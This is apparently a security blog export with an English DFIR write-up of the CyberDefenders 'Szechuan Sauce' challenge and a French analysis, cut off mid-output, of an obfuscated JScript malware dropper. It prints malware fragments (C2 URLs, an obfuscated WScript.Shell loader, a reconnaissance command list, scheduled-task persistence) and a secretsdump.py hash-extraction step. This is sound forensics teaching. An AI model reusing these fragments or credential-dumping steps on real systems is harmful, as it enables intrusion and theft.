[{"content":"The scenario:\nYour bedroom door bursts open, shattering your pleasant dreams. Your mad scientist of a boss begins dragging you out of bed by the ankle. He simultaneously explains between belches that the FBI contacted him. They found his recently-developed Szechuan sauce recipe on the dark web. As you careen past the door frame you are able to grab your incident response “Go-Bag”. Inside is your trusty incident thumb drive and laptop. Some files may be corrupted just like in the real world. If one tool does not work for you, find another one.\nAbstract # This article presents a unique challenge involving a scenario inspired by the television series \u0026ldquo;Rick and Morty.\u0026rdquo; In this challenge, a mad scientist boss drags you out of bed, claiming that the FBI contacted him about his stolen Szechuan sauce recipe found on the dark web. The challenge instructs you to use various tools to investigate multiple file types, each associated with specific tools. The questions presented in the challenge aim to uncover critical information about the compromise.\nTo summarize, the challenge delves into tasks like identifying the operating systems, discovering the initial entry vector, tracking the attacker\u0026rsquo;s movement, and determining the attack tool employed. It offers a practical exercise for incident response professionals to hone their skills in a simulated cyber investigation environment.\nRick from Rick and Morty, this challenge is a reference to this sitcom. Just before starting\u0026hellip; # This challenge contains many files. We have a lot of information and the challenge will not help you on which file you have to investigate on. You have to understand the differences between filetypes and tools associated.\nLet\u0026rsquo;s take a look to each of them:\n20200918_0417_DESKTOP-SDN1RPT.E01, E02, E03 and E04 Disk dump from a machine named DESKTOP-SDN1RPT. The reason why there are four files is because of the tool used (Encase), it cut the dump into four file for convenience, but you can consider as one file split into four.\n20200918_0417_DESKTOP-SDN1RPT.E01.txt It contains various information on 20200918_0417_DESKTOP-SDN1RPT.E01 such as the software used to acquire the dump (FTK Imager), file hash, evidence number and lot of technical stuff which is not interesting for us. By the way, this file is very usefull in real case.\nautoruns-desktop-sdn1rpt.csv CSV file which contains information about software configured to run when the machine is booted or a user log-in.\nautorunsc-citadel-dc01.csv Same as the previous one, but for the citadel machine.\ncase001.pcap Network capture, contains information on network traffic.\ncitadeldc01.mem RAM dump of the citadel machine, containing all runtime information.\nDESKTOP-SDN1RPT.mem Same as the previous one, but for the desktop machine.\nE01-DC01/ 20200918_0347_CDrive.E01, E02\n20200918_0347_CDrive.E01.txt\nBellow a table summarizing tool and filetype associated:\nExtension Tool E0x Autopsy, FTK Imager mem Volatility pcap Wireshark, Network Miner, Brim Security csv, txt Text editor, or an Excel like I will use Autopsy and not FTK Imager because Autopsy has a powerfull OS parser and FTK Imager is just to open and browse image file. Plus, I will not use Brim Security, as I\u0026rsquo;m not familiar with, instead, I will use Wireshark and Network Miner.\nQ1 What’s the Operating System version of the Server? (two words) # Using Autopsy, create a new case and add data source (image file, add both E01) and waits until parsing is complete. Then, go to Operating System Information:\nThe Program Name column contains the OS version. To fully understand where this information is stored, you can also parse hives located at C:\\Windows\\System32\\config\\SOFTWARE, in the key Microsoft\\Windows NT\\CurrentVersion, Autopsy provides a native parser but you can also use Registry Explorer from Eric Zimmerman.\nQ2 What’s the Operating System of the Desktop? (four words separated by spaces) # Same as the previous one.\nQ3 What was the IP address assigned to the domain controller? # As explained in the Q1, you can dump the SYSTEM hive located at: C:\\Windows\\System32\\config. Or, use Network Miner, you have to convert case001.pcap into a format accepted by the software. To do that, just open the file with Wireshark \u0026gt; Save As \u0026gt; Choose Wireshark/tcpdump... - pcap and open it with Network Miner. Once opened, you will see an overview of the network:\nI love this tool, as it provides a very usefull overview, especially in this challenge where there are many machines. Search for a Citadel Windows machine and there is the IP.\nQ4 What was the timezone of the Server? # Tricky question, first, you have to find the timezone set into the server. It\u0026rsquo;s located into the SYSTEM registry. Using Autopsy, you can easily read it:\nThe server is set on Pacific Standard Time which is UTC-7. But the admin set a wrong timezone on the domain controller. You can see it on NTP packets (clock unsynchronized). To retrieve the correct timezone, you can correlate two events in the network and in the DC. To see how you can do, you can check this write-up: https://ellisstannard.medium.com/cyberdefenders-szechuan-sauce-writeup-ab172eb7666c.\nYou will see that the system is set one hour after the correct timezone, so the answer is UTC-6.\nQ5 What was the initial entry vector (how did they get in)?. Provide protocol name. # Extract security logs from the DC located at: %System32%\\winevt\\Logs\\Security.evtx. Then, you can use a log viewer such as Microsoft Event Viewer \u0026gt; click on Open saved logs \u0026gt; select your export.\nTime to analyze, you can assume that the attacker wants to log into the machine. Each event has a given ID and the ID for failed attempt is 4625 and 4624 for a successfull one. To quickly have the list of the person who wants to access the machine, I used both EvtxECmd to dump all the logs (the Windows view did not satisfy me) and EZViewer to vizualize them. We can see that a Kali machine bruteforced the access with a successfull authentication on the DC using LogonType 10 which is RDP, we also have an IP.\nPlus, we can investigate on the network dump. A good first step is to get an overview; Statistics \u0026gt; Protocol Hierarchy.\nI highlighted RDP over UDP, this is interesting because RDP provides a graphical interface to connect to another computer over a network connection. Sometimes, RDP is used by attacker to gain access. To investigate more in depth, search on rdp \u0026amp;\u0026amp; ip.dst == 10.42.85.10 (DC IP address). The first packet contains a Cookie filled with the value nmap, which is a scanning tool used by attackers. Plus, the source address is 194.61.24.102, using VirusTotal you will see that this IP ws used by pirates.\nThe protocol name is RDP.\nQ6 What was the malicious process used by the malware? (one word) # Attacker gained access to the DC and we want to know what\u0026rsquo;s happened on this machine, time to use Volatility! Usually, I start my investigation with pstree to get an overview:\nPID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime 4 0 System 0xe00062c0a900 98 - N/A False 2020-09-19 01:22:38.000000 N/A * 204 4 smss.exe 0xe00062c0a900 2 - N/A False 2020-09-19 01:22:38.000000 N/A 324 316 csrss.exe 0xe00062c0a900 8 - 0 False 2020-09-19 01:22:39.000000 N/A 404 316 wininit.exe 0xe00062c0a900 1 - 0 False 2020-09-19 01:22:40.000000 N/A * 460 404 lsass.exe 0xe00062c0a900 31 - 0 False 2020-09-19 01:22:40.000000 N/A * 452 404 services.exe 0xe00062c0a900 5 - 0 False 2020-09-19 01:22:40.000000 N/A ** 640 452 svchost.exe 0xe00062c0a900 8 - 0 False 2020-09-19 01:22:40.000000 N/A *** 2056 640 WmiPrvSE.exe 0xe00062c0a900 11 - 0 False 2020-09-19 01:23:21.000000 N/A *** 2764 640 WmiPrvSE.exe 0xe00062c0a900 6 - 0 False 2020-09-19 04:37:42.000000 N/A ** 1292 452 Microsoft.Acti 0xe00062c0a900 9 - 0 False 2020-09-19 01:22:57.000000 N/A ** 3724 452 spoolsv.exe 0xe00062c0a900 13 - 0 False 2020-09-19 03:29:40.000000 N/A ** 1556 452 VGAuthService. 0xe00062c0a900 2 - 0 False 2020-09-19 01:22:57.000000 N/A ** 796 452 vds.exe 0xe00062c0a900 11 - 0 False 2020-09-19 01:23:20.000000 N/A ** 668 452 svchost.exe 0xe00062c0a900 16 - 0 False 2020-09-19 01:22:41.000000 N/A ** 2460 452 msdtc.exe 0xe00062c0a900 9 - 0 False 2020-09-19 01:23:21.000000 N/A ** 800 452 svchost.exe 0xe00062c0a900 12 - 0 False 2020-09-19 01:22:40.000000 N/A ** 928 452 svchost.exe 0xe00062c0a900 16 - 0 False 2020-09-19 01:22:41.000000 N/A ** 1956 452 svchost.exe 0xe00062c0a900 30 - 0 False 2020-09-19 01:23:20.000000 N/A ** 2216 452 dllhost.exe 0xe00062c0a900 10 - 0 False 2020-09-19 01:23:21.000000 N/A ** 684 452 svchost.exe 0xe00062c0a900 6 - 0 False 2020-09-19 01:22:40.000000 N/A ** 1332 452 dfsrs.exe 0xe00062c0a900 16 - 0 False 2020-09-19 01:22:57.000000 N/A ** 1600 452 vmtoolsd.exe 0xe00062c0a900 9 - 0 False 2020-09-19 01:22:57.000000 N/A ** 848 452 svchost.exe 0xe00062c0a900 39 - 0 False 2020-09-19 01:22:41.000000 N/A *** 3056 848 WMIADAP.exe 0xe00062c0a900 5 - 0 False 2020-09-19 04:37:42.000000 N/A *** 3796 848 taskhostex.exe 0xe00062c0a900 7 - 1 False 2020-09-19 04:36:03.000000 N/A ** 1236 452 svchost.exe 0xe00062c0a900 8 - 0 False 2020-09-19 01:23:21.000000 N/A ** 1368 452 dns.exe 0xe00062c0a900 16 - 0 False 2020-09-19 01:22:57.000000 N/A ** 1000 452 svchost.exe 0xe00062c0a900 18 - 0 False 2020-09-19 01:22:41.000000 N/A ** 1644 452 wlms.exe 0xe00062c0a900 2 - 0 False 2020-09-19 01:22:57.000000 N/A ** 1392 452 ismserv.exe 0xe00062c0a900 6 - 0 False 2020-09-19 01:22:57.000000 N/A ** 1660 452 dfssvc.exe 0xe00062c0a900 11 - 0 False 2020-09-19 01:22:57.000000 N/A 412 396 csrss.exe 0xe00062c0a900 10 - 1 False 2020-09-19 01:22:40.000000 N/A 492 396 winlogon.exe 0xe00062c0a900 4 - 1 False 2020-09-19 01:22:40.000000 N/A * 808 492 dwm.exe 0xe00062c0a900 7 - 1 False 2020-09-19 01:22:40.000000 N/A 3644 2244 coreupdater.ex 0xe00062c0a900 0 - 2 False 2020-09-19 03:56:37.000000 2020-09-19 03:56:52.000000 3472 3960 explorer.exe 0xe00062c0a900 39 - 1 False 2020-09-19 04:36:03.000000 N/A * 2608 3472 vmtoolsd.exe 0xe00062c0a900 8 - 1 False 2020-09-19 04:36:14.000000 N/A * 2840 3472 FTK Imager.exe 0xe00062c0a900 9 - 1 False 2020-09-19 04:37:04.000000 N/A * 3260 3472 vm3dservice.ex 0xe00062c0a900 1 - 1 False 2020-09-19 04:36:14.000000 N/A 400 1904 ServerManager. 0xe00062c0a900 10 - 1 False 2020-09-19 04:36:03.000000 N/A There is no obvious malicious file, but correlating pstree with netscan we will have a lot of results because it\u0026rsquo;s a DC. Let\u0026rsquo;s try to find a C2 evidence by highlighting the network traffic:\nOffset\tProto\tLocalAddr\tLocalPort\tForeignAddr\tForeignPort\tState\tPID\tOwner\tCreated 0x3148500\tTCPv4\t0.0.0.0\t636\t0.0.0.0\t0\tLISTENING\t460\tlsass.exe\t- 0x314ac30\tTCPv4\t0.0.0.0\t389\t0.0.0.0\t0\tLISTENING\t460\tlsass.exe\t- 0x314ac30\tTCPv6\t::\t389\t::\t0\tLISTENING\t460\tlsass.exe\t- 0x31fa880\tUDPv4\t0.0.0.0\t0\t*\t0\t460\tlsass.exe\t2020-09-19 01:22:50.000000 0x3f2b560\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 0x5ea7910\tTCPv4\t0.0.0.0\t49152\t0.0.0.0\t0\tLISTENING\t404\twininit.exe\t- 0x5ea7910\tTCPv6\t::\t49152\t::\t0\tLISTENING\t404\twininit.exe\t- 0x5eabed0\tTCPv4\t0.0.0.0\t49152\t0.0.0.0\t0\tLISTENING\t404\twininit.exe\t- 0x5eaf250\tTCPv4\t0.0.0.0\t135\t0.0.0.0\t0\tLISTENING\t684\tsvchost.exe\t- 0x5eb0540\tTCPv4\t0.0.0.0\t135\t0.0.0.0\t0\tLISTENING\t684\tsvchost.exe\t- 0x5eb0540\tTCPv6\t::\t135\t::\t0\tLISTENING\t684\tsvchost.exe\t- 0x5ee0b90\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 0x5ee9d20\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 0x5f25300\tTCPv4\t0.0.0.0\t49153\t0.0.0.0\t0\tLISTENING\t800\tsvchost.exe\t- 0x5f25300\tTCPv6\t::\t49153\t::\t0\tLISTENING\t800\tsvchost.exe\t- 0x5f284a0\tTCPv4\t0.0.0.0\t49153\t0.0.0.0\t0\tLISTENING\t800\tsvchost.exe\t- 0x5f9bec0\tUDPv4\t0.0.0.0\t0\t*\t0\t928\tsvchost.exe\t2020-09-19 01:23:09.000000 0x5f9bec0\tUDPv6\t::\t0\t*\t0\t928\tsvchost.exe\t2020-09-19 01:23:09.000000 0x5fa53b0\tUDPv4\t10.42.85.10\t41136\t*\t0\t4\tSystem\t2020-09-19 01:22:42.000000 0x5fb76c0\tUDPv4\t10.42.85.10\t41136\t*\t0\t4\tSystem\t2020-09-19 01:22:42.000000 0x5fd1880\tTCPv4\t0.0.0.0\t49154\t0.0.0.0\t0\tLISTENING\t848\tsvchost.exe\t- 0x5fd1880\tTCPv6\t::\t49154\t::\t0\tLISTENING\t848\tsvchost.exe\t- 0x5fdcdd0\tTCPv4\t0.0.0.0\t49154\t0.0.0.0\t0\tLISTENING\t848\tsvchost.exe\t- ... 0x20df6ba0\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 0x20e28d10\tTCPv6\tfe80::2dcf:e660:be73:d220\t49155\tfe80::2dcf:e660:be73:d220\t62777\tCLOSED\t460\tlsass.exe\t- 0x20f52a00\tTCPv6\tfe80::2dcf:e660:be73:d220\t135\tfe80::2dcf:e660:be73:d220\t62779\tCLOSED\t684\tsvchost.exe\tN/A 0x20fc7590\tTCPv4\t10.42.85.10\t62613\t203.78.103.109\t443\tESTABLISHED\t3644\tcoreupdater.ex\tN/A 0x20fffe50\tTCPv4\t0.0.0.0\t62475\t0.0.0.0\t0\tLISTENING\t3724\tspoolsv.exe\t- 0x20fffe50\tTCPv6\t::\t62475\t::\t0\tLISTENING\t3724\tspoolsv.exe\t- 0x211a9560\tUDPv4\t0.0.0.0\t0\t*\t0\t1368\tdns.exe\t2020-09-19 01:22:57.000000 coreupdater.exe is suspicious because it uses port number 443 and its IP is tagged as malicious by Virus Total. It\u0026rsquo;s surrely our malware.\nQ7 Which process did malware migrate to after the initial compromise? (one word) # A very usefull Volatility plugin is malfind, it helps to identify injected code inside process. A Windows executable always start with MZ. Finding a MZ header inside a process is very suspicious because is a strong sign of code injection.\n3724 spoolsv.exe 0x4afc1f0000 0x4afc25afff VadS PAGE_EXECUTE_READWRITE 107 1 Disabled 4d 5a 90 00 03 00 00 00 MZ...... 04 00 00 00 ff ff 00 00 ........ b8 00 00 00 00 00 00 00 ........ 40 00 00 00 00 00 00 00 @....... 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 01 00 00 ........ 0x4afc1f0000: pop r10 0x4afc1f0002: nop 0x4afc1f0003: add byte ptr [rbx], al 0x4afc1f0005: add byte ptr [rax], al 0x4afc1f0007: add byte ptr [rax + rax], al 0x4afc1f000a: add byte ptr [rax], al 3724 spoolsv.exe 0x4afc070000 0x4afc0a8fff VadS PAGE_EXECUTE_READWRITE 57 1 Disabled 4d 5a 41 52 55 48 89 e5 MZARUH.. 48 83 ec 20 48 83 e4 f0 H...H... e8 00 00 00 00 5b 48 81 .....[H. c3 b7 57 00 00 ff d3 48 ..W....H 81 c3 34 b6 02 00 48 89 ..4...H. 3b 49 89 d8 6a 04 5a ff ;I..j.Z. d0 00 00 00 00 00 00 00 ........ 00 00 00 00 f0 00 00 00 ........ 0x4afc070000: pop r10 0x4afc070002: push r10 0x4afc070004: push rbp 0x4afc070005: mov rbp, rsp 0x4afc070008: sub rsp, 0x20 0x4afc07000c: and rsp, 0xfffffffffffffff0 0x4afc070010: call 0x4afc070015 0x4afc070015: pop rbx 0x4afc070016: add rbx, 0x57b7 0x4afc07001d: call rbx 0x4afc07001f: add rbx, 0x2b634 0x4afc070026: mov qword ptr [rbx], rdi 0x4afc070029: mov r8, rbx 0x4afc07002c: push 4 0x4afc07002e: pop rdx 0x4afc07002f: call rax 0x4afc070031: add byte ptr [rax], al 0x4afc070033: add byte ptr [rax], al 0x4afc070035: add byte ptr [rax], al 0x4afc070037: add byte ptr [rax], al 0x4afc070039: add byte ptr [rax], al 0x4afc07003b: add al, dh 0x4afc07003d: add byte ptr [rax], al 3724 spoolsv.exe 0x4afc260000 0x4afc283fff VadS PAGE_EXECUTE_READWRITE 36 1 Disabled 4d 5a 90 00 03 00 00 00 MZ...... 04 00 00 00 ff ff 00 00 ........ b8 00 00 00 00 00 00 00 ........ 40 00 00 00 00 00 00 00 @....... 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 e0 00 00 00 ........ 0x4afc260000: pop r10 0x4afc260002: nop 0x4afc260003: add byte ptr [rbx], al 0x4afc260005: add byte ptr [rax], al 0x4afc260007: add byte ptr [rax + rax], al 0x4afc26000a: add byte ptr [rax], al Q8 Identify the IP Address that delivered the payload. # Refer to Q5 answer. Using this Wireshark filter : rdp \u0026amp;\u0026amp; ip.dst == 10.42.85.10 we can see that the source IP is always 194.61.24.102. Plus, VirusTotal flag this IP as potentially malicious. Using Network Miner, there is another clue, this machine uses nmap:\nQ9 What IP Address was the malware calling to? # Since Q6, we already know that 203.78.103.109 is the C2 IP.\nQ10 Where did the malware reside on the disk? # We are looking for disk evidence, let\u0026rsquo;s use Autopsy again. To search for a filename, go to Tools \u0026gt; File Search by Attributes:\nHere are the results:\nQ11 What\u0026rsquo;s the name of the attack tool you think this malware belongs to? (one word) # Extract coreupdater.exe, calculate its footprint and go to VirusTotal, you will find that this program is built on Metasploit. I suppose that is you try to reverse it, you will find the tool name too.\nQ12 One of the involved malicious IP\u0026rsquo;s is based in Thailand. What was the IP? # Use an online tool like https://www.hostip.fr/ to locate one of the previous two IP address.\nQ13 Another malicious IP once resolved to klient-293.xyz . What is this IP? # I didn\u0026rsquo;t understood the question and its sens. I tried to search on this hostname on the network dump. One of the intended answer was to use Virus Total and retrieve one of the previous involved IP.\nQ14 The attacker performed some lateral movements and accessed another system in the environment via RDP. What is the hostname of that system? # We have two disk and RAM dumps, we can assume that the second system is Desktop-SDN1RPT, but let\u0026rsquo;s prove it. Thanks to Wireshark, we can get all the outgoing RDP connexion from the DC: rdp \u0026amp;\u0026amp; ip.src == 10.42.85.10. You can see packets from the DC to the attacker\u0026rsquo;s host but also to 10.42.85.115, thanks to Network Miner, you can find that this IP is related to Desktop-SDN1RPT. If you don\u0026rsquo;t have Network Miner, you can resolve the hostname by searching LLMNR packets in Wireshark.\nQ15 Other than the administrator, which user has logged into the Desktop machine? (two words) # You can browse logs but when a user login for the first time, a new user is created on the host machine. Go to C:\\Users to see all of them. I don\u0026rsquo;t know which one is the intended one but it\u0026rsquo;s Rick Sanchez.\nQ16 What was the password for \u0026ldquo;jerrysmith\u0026rdquo; account? # Quite tricky question, and not a forensic one. You can resolve it by extract hashes from the DC disk dump and crack them. To extract it, use secretsdump.py or ntdsutils.exe (available in a DC), the first method is the easiest one. First, you need to extract files which contains hashes:\nC:\\Windows\\System32\\config\\SYSTEM\nC:\\Windows\\NTDS\\ntds.dit\nThen, use the Python tool to extract hashes and finally crack them with John, Hashcat on an online tool (weak password). To extract hashes with secretsdump.py:\npython secretsdump.py -system \u0026lt;SYSTEM hive path\u0026gt; -ntds \u0026lt;ntds.dit path\u0026gt; -outputfile \u0026lt;path\u0026gt;\nQ17 What was the original filename for Beth’s secrets? # We can suppose that this file has a name like .*secret.* or .*beth.*, we can search a file by its filename with Autopsy (Tools \u0026gt; File Search by Attributes), we will find several files related to Beth_Secret.txt. Plus, Autopsy can read it and give its content.\nQ18 What was the content of Beth’s secret file? ( six words, spaces in between) # Unfortunately, this isn\u0026rsquo;t the correct answer. We can see that the file was deleted (red cross), maybe the file is still in the bin? Go to $Recycle.Bin, there is a folder named like S-1-...-500, 500 is the Administrator\u0026rsquo;s ID, so this folder contains Administrator\u0026rsquo;s deleted files. Inside it, filenames are broken (if you know how filesystem works you already know that is intended), just open each of them, you will find the answer. The very first one contains printable caracters: FileShare\\Secrets\\SECRET_beth.txt and the second one contains its content.\nQ19 The malware tried to obtain persistence in a similar way to how Carbanak malware obtains persistence. What is the corresponding MITRE technique ID? # Tricky question, as you juste have to do some threat hunting; search informations on Cabarnak malware and its persitence method. You will find this website: https://attack.mitre.org/groups/G0008/, search for persistence and its Mitre ID.\n","date":"26 octobre 2023","permalink":"/write-up/cyberdefenders-digital-forensics-szechuan-sauce/","section":"Write-up","summary":"The scenario:\nYour bedroom door bursts open, shattering your pleasant dreams.","title":"Cyberdefenders · Digital Forensic · Szechuan Sauce"},{"content":"Il y a quelques temps, j\u0026rsquo;ai résolu le challenge Obfuscated de Cyberdefenders. Cependant, le challenge s\u0026rsquo;arrête juste avant l\u0026rsquo;analyse du code qui intéragit avec le C2. J\u0026rsquo;ai donc décidé de poursuivre l\u0026rsquo;analyse afin de comprendre en détail son fonctionnement et pourquoi pas faire un peu de Threat Intelligence\u0026hellip;\nIl sera question de mettre en contexte l\u0026rsquo;analyse en rappellant les éléments essentiels du challenge, décortiquer le code malveillant afin de comprendre ses actions pour enfin analyser la menace dans le but de dégager une tendance.\nRappel du challenge # En résumé, nous sommes un analyste spécialisé qui a reçu une alerte à propos d\u0026rsquo;un poste utilisateur au comportement étrange. On nous livre un document Word qui semble être la source de cette alerte.\nLe document contient des macros, c\u0026rsquo;est-à-dire du script embarqué qui est utilisé pour automatiser un certains nombre de tâches. Cependant, les pirates utilisent cette fonctionnalité pour infecter des postes. Afin d\u0026rsquo;être plus discret et complexifier le travail des analystes, le code est obfusqué et l\u0026rsquo;infection est en plusieurs étapes. Le code est du JScript qui est un fichier de scripting Microsoft qui permet de lancer des commandes, c\u0026rsquo;est plutôt proche du Javascript avec quelques ajouts en plus, comme la possibilité d\u0026rsquo;intéragir avec le système hôte.\nLe code malveillant contient de la donnée codée en base64 et une implémentation d\u0026rsquo;un chiffrement type RC4 qui permet de déchiffrer la donnée obtenue après le décodage du base64. Une fois ceci fait, le challenge est terminé, et pourtant il nous reste le code le plus intéressant à explorer.\nAu pays du JScript # Initialisation # Le code est toujours obfusqué, mais il me semble qu\u0026rsquo;il l\u0026rsquo;est moins que lors de l\u0026rsquo;étape précédente ; quelques variables ont un nom \u0026ldquo;en clair\u0026rdquo; :\nfor (var count = 0; count \u0026lt; ayuh; count++) { switch (Math.ceil(Math.random() * 3)) { case 1: name = name + Math.ceil(Math.random() * 8); break; [...] eV_C(\u0026#34;TaskManager\u0026#34;, \u0026#34;Windows Task Manager\u0026#34;, username, v_FileName, \u0026#34;EzZETcSXyKAdF_e5I2i1\u0026#34;, wyKN, false); La première étape initialise certaines variables pour la suite du script :\nstockage des deux URLs des C2 dans une variable, les URLs ne sont pas obfusquées.\nstockage des commandes de reconnaissance du système dans une variable, non obfusquées.\ninitialisation d\u0026rsquo;une variable qui contient le nom du script, elle sera utilisée plus tard.\nvar CKpR = new Array(\u0026#34;http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php\u0026#34;, \u0026#34;http://www.folk-cantabria.com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field.php\u0026#34;); var tpO8 = \u0026#34;w3LxnRSbJcqf8HrU\u0026#34;; var recon_commands = new Array(\u0026#34;systeminfo \u0026gt; \u0026#34;, \u0026#34;net view \u0026gt;\u0026gt; \u0026#34;, \u0026#34;net view /domain \u0026gt;\u0026gt; \u0026#34;, \u0026#34;tasklist /v \u0026gt;\u0026gt; \u0026#34;, \u0026#34;gpresult /z \u0026gt;\u0026gt; \u0026#34;, \u0026#34;netstat -nao \u0026gt;\u0026gt; \u0026#34;, \u0026#34;ipconfig /all \u0026gt;\u0026gt; \u0026#34;, \u0026#34;arp -a \u0026gt;\u0026gt; \u0026#34;, \u0026#34;net share \u0026gt;\u0026gt; \u0026#34;, \u0026#34;net use \u0026gt;\u0026gt; \u0026#34;, \u0026#34;net user \u0026gt;\u0026gt; \u0026#34;, \u0026#34;net user administrator \u0026gt;\u0026gt; \u0026#34;, \u0026#34;net user /domain \u0026gt;\u0026gt; \u0026#34;, \u0026#34;net user administrator /domain \u0026gt;\u0026gt; \u0026#34;, \u0026#34;set \u0026gt;\u0026gt; \u0026#34;, \u0026#34;dir %systemdrive%\\x5cUsers\\x5c*.* \u0026gt;\u0026gt; \u0026#34;, \u0026#34;dir %userprofile%\\x5cAppData\\x5cRoaming\\x5cMicrosoft\\x5cWindows\\x5cRecent\\x5c*.* \u0026gt;\u0026gt; \u0026#34;, \u0026#34;dir %userprofile%\\x5cDesktop\\x5c*.* \u0026gt;\u0026gt; \u0026#34;, \u0026#34;tasklist /fi \\x22modules eq wow64.dll\\x22 \u0026gt;\u0026gt; \u0026#34;, \u0026#34;tasklist /fi \\x22modules ne wow64.dll\\x22 \u0026gt;\u0026gt; \u0026#34;, \u0026#34;dir \\x22%programfiles(x86)%\\x22 \u0026gt;\u0026gt; \u0026#34;, \u0026#34;dir \\x22%programfiles%\\x22 \u0026gt;\u0026gt; \u0026#34;, \u0026#34;dir %appdata% \u0026gt;\u0026gt;\u0026#34;); var QUjy = new ActiveXObject(\u0026#34;Scripting.FileSystemObject\u0026#34;); var script_name = WScript.ScriptName; Le programme va initialiser la classe WScriptShell qui permettra par la suite d\u0026rsquo;exécuter les commandes ci-dessus. Cette initialisation est obfusquée en deux étapes, sans doute pour ne pas déclencher l\u0026rsquo;antivirus.\nfunction get_WScriptShell() {// ActiveXObject(WScript.Shell()) var spq3 = this[\u0026#39;\\u0041\\u0063\\u0074i\\u0076eX\\u004F\\u0062j\\u0065c\\u0074\u0026#39;]; // ActiveXObject var zBVv = new spq3(\u0026#39;\\u0057\\u0053cr\\u0069\\u0070\\u0074\\u002E\\u0053he\\u006C\\u006C\u0026#39;); // WScript.Shell return zBVv; } Premier niveau de persistance : copie du script # Le code se localise dans le système de la victime puis va chercher à se copier dans c:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\Microsoft\\Windows\\ ou c:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\Temp\\ ou c:\\Documents and Settings\\\u0026lt;username\u0026gt;\\Application Data\\Microsoft\\Windows\\, selon si les chemins existent sur le système.\nLe malware va également essayer de se maintenir dans le système en se copiant dans le premier répertoire existant, avant de se mettre en dormance pendant un temps variable entre 5 et 10 minutes.\nSecond niveau de persistance : tâche planifiée # Après la dormance, le script va se créer une tâche planifiée dont voici les caractéristiques :\nla tâche est créée sous l\u0026rsquo;identifiant de l\u0026rsquo;utilisateur courant.\nla description de la tâche est générique : Windows Task Manager.\nla tâche est immédiatement activée et démarerra dès que possible.\nla tâche n\u0026rsquo;est pas masquée à l\u0026rsquo;utilisateur.\nla date de début et de fin du déclencheur de la tâche sont 2015-07-12T11:47:24 et 2020-03-21T08:00:00 (non obfusquées).\nla tâche s\u0026rsquo;exécute quand l\u0026rsquo;utilisateur est connecté au système.\nl\u0026rsquo;action de la tâche est d\u0026rsquo;exécuter le programme envoyé par le C2.\nl\u0026rsquo;argument envoyé au programme est EzZETcSXyKAdF_e5I2i1, qui était une clef de déchiffrement de la première étape d\u0026rsquo;infection.\nle payload final s\u0026rsquo;exécutera dans le premier emplacement disponible (voir le premier niveau de persistance).\nReconnaissance # Avant de recevoir les indications du C2, le programme effectue de la reconnaissance avec cmd.exe. Il cherche à obtenir des informations sur la machine de la victime mais également sur les connexions réseaux et les tâches planifiées.\nLe programme créé également un fichier ~dat.tmp à l\u0026rsquo;endroit où il aura réussi à se copier pour contenir les informations de la reconnaissance.\nsysteminfo \u0026gt;\rnet view \u0026gt;\u0026gt;\rnet view /domain \u0026gt;\u0026gt;\rtasklist /v \u0026gt;\u0026gt;\rgpresult /z \u0026gt;\u0026gt;\rnetstat -nao \u0026gt;\u0026gt;\ripconfig /all \u0026gt;\u0026gt;\rarp -a \u0026gt;\u0026gt;\rnet share \u0026gt;\u0026gt;\rnet use \u0026gt;\u0026gt;\rnet user \u0026gt;\u0026gt;\rnet user administrator \u0026gt;\u0026gt;\rnet user /domain \u0026gt;\u0026gt;\rnet user administrator /domain \u0026gt;\u0026gt;\rset \u0026gt;\u0026gt;\rdir %systemdrive%\\x5cUsers\\x5c*.* \u0026gt;\u0026gt;\rdir %userprofile%\\x5cAppData\\x5cRoaming\\x5cMicrosoft\\x5cWindows\\x5cRecent\\x5c*.* \u0026gt;\u0026gt;\rdir %userprofile%\\x5cDesktop\\x5c*.* \u0026gt;\u0026gt;\rtasklist /fi \\x22modules eq wow64.dll\\x22 \u0026gt;\u0026gt; tasklist /fi \\x22modules ne wow64.dll\\x22 \u0026gt;\u0026gt;\rdir \\x22%programfiles(x86)%\\x22 \u0026gt;\u0026gt;\rdir \\x22%programfiles%\\x22 \u0026gt;\u0026gt; dir %appdata% \u0026gt;\u0026gt; Voici un exemple de ce que produisent ces commandes :\nNom de l\u0026#39;h“te: WINOUT\rNom du systŠme d\u0026#39;exploitation: Microsoft Windows 11 Professionnel\rVersion du systŠme: 10.0.22621 N/A build 22621\rFabricant du systŠme d\u0026#39;exploitation: Microsoft Corporation\rConfiguration du systŠme d\u0026#39;exploitation: Station de travail autonome\rType de build du systŠme d\u0026#39;exploitation: Multiprocessor Free\rPropri‚taire enregistr‚: \u0026lt;username\u0026gt;@outlook.fr\rOrganisation enregistr‚e: Identificateur de produit: 00330-52085-32356-AAOEM\rDate d\u0026#39;installation originale: 09/05/2023, 17:06:41\rHeure de d‚marrage du systŠme: 04/10/2023, 20:08:47\rFabricant du systŠme: Dell Inc.\rModŠle du systŠme: Latitude 5590\rType du systŠme: x64-based PC\rProcesseur(s): 1 processeur(s) install‚(s).\r[01]ÿ: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~1600 MHz\rVersion du BIOS: Dell Inc. 1.17.0, 02/06/2021\rR‚pertoire Windows: C:\\Windows\rR‚pertoire systŠme: C:\\Windows\\system32\rP‚riph‚rique d\u0026#39;amor‡age: \\Device\\HarddiskVolume4\rOption r‚gionale du systŠme: fr;Fran‡ais (France)\rParamŠtres r‚gionaux d\u0026#39;entr‚e: fr;Fran‡ais (France)\rFuseau horaire: (UTC+01:00) Bruxelles, Copenhague, Madrid, Paris\rM‚moire physique totale: 16ÿ242 Mo\rM‚moire physique disponible: 9ÿ771 Mo\rM‚moire virtuelleÿ: taille maximale: 17ÿ266 Mo\rM‚moire virtuelleÿ: disponible: 10ÿ146 Mo\rM‚moire virtuelleÿ: en cours 